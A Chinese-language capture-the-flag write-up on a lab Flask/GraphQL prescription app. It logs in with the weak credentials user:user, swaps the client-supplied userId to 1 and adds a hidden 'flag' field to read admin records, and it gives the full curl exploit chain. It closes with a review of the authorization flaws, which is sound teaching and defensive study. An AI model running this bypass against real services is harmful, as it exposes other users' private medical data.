## 题解

### 入口与指纹

`Werkzeug/3.0.3` + `Python/3.8.17`，Flask + Jinja，服务名 **MedGuard**（医疗开方系统）。

`GET /` → `302 /login`。登录是 **fetch + JSON**：

```javascript
fetch('/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username, password }),
})
.then(r => r.json())
.then(data => {
  if (data.message === "Login successful") {
    localStorage.setItem('userID', data.userID);   // ← 用户 ID 存在 localStorage
    window.location.href = "/add_prescription";
  }
});
```

`user:user` 可用，返回 `{"message":"Login successful","userID":2}`，同时下发签名 session cookie。

登录后导航：`Add Prescription` / `View Prescriptions` / `Logout`。

`/openapi.json` 404（不是 FastAPI），所以接口只能从页面脚本里读。

### 关键观察

**1. 业务查询走 GraphQL，且 `userId` 由客户端提供。**

`/add_prescription` 的内联脚本：

```javascript
body: JSON.stringify({
  query: `
    mutation {
      addPrescription(userId: ${userID}, prescriptionDetails: "${prescriptionDetails}") {
        prescription { id userId prescriptionDetails flag }
      }
    }
  `,
})
```

`userID` 来自 `localStorage`——**完全由客户端控制**，不是从 session 取的。

**2. `~view_prescriptions` 的注释直接指出了隐藏字段。**

```javascript
// dont pass flag in query parameter because it will fetched
body: JSON.stringify({
  query: `
    query {
      getPrescriptions(userId: ${userID}) {
        id
        userId
        prescriptionDetails
      }
    }
  `,
})
```

「别在查询里带 `flag`，带了就会被返回」——这句话等于告诉你 schema 里有 `flag` 字段。
GraphQL 的 introspection 也可用，但这里连 introspection 都不需要。

**3. 把 `userId` 改成 1 就能读管理员的数据，且 `flag` 只在其中一条上。**

```graphql
query {
  getPrescriptions(userId: 1) {
    id userId prescriptionDetails flag
  }
}
```

返回 90 条管理员的处方，其中第 43 条的 `flag` 非空：

```json
{"id":43,"userId":1,"prescriptionDetails":"Prescription 43 for Admin",
 "flag":"flag{ee10c9ab-3340-4b01-ae7e-5c0af48ce4fe}"}
```

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)

# 1. 用弱口令 user:user 登录（拿 session cookie）
curl -sS -c $cj -b $cj -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"user"}' "http://$T/login"

# 2. 直接打 GraphQL，把 userId 换成 1，并把隐藏字段 flag 加进选择集
curl -sS -b $cj -H 'Content-Type: application/json' \
  --data-binary '{"query":"query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}' \
  "http://$T/graphql" \
| python3 -c 'import json,sys
for p in json.load(sys.stdin)["data"]["getPrescriptions"]:
    if p.get("flag"): print(p["flag"]); break'
```

### flag 位置

管理员（`userId=1`）第 43 条处方的 `flag` 字段。普通用户（`userId=2`）的查询里该字段恒为 `null`。

## 复盘

- **`localStorage` 里的 ID 就是攻击面。** 前端把 `userID` 存进 `localStorage` 再拼进 GraphQL 参数，
  服务端如果信这个值，就等于把对象级授权交给客户端。判断方法：看查询里有没有
  `${userID}` 这种拼接，以及登录响应是否把 ID 交给前端保存。
- **注释是免费的 schema 文档。** `// dont pass flag in query parameter because it will fetched`
  这一句同时暴露了两件事：存在 `flag` 字段、以及它默认不返回。
  读源码时，注释的价值经常高于代码本身。
- **GraphQL 的字段级授权必须单独校验。** 默认查询不带 `flag` 不代表服务端会拒绝带 `flag` 的查询。
  只要字段在 schema 里且 resolver 不判权限，加进选择集就能拿到。
- **弱口令仍然是最省事的第一步。** `user:user` 一次命中；`admin/admin`、`test/test`、`demo/demo`
  都不对。命中后拿到的 session 只是"门票"，真正的越权发生在 GraphQL 参数上。
- **"列表里有 90 条但只有 1 条带 flag" 是刻意设计。** 说明出题人希望你把 `flag` 字段加进选择集，
  而不是去猜哪条数据特殊——加字段后一次请求就能筛出非空值。
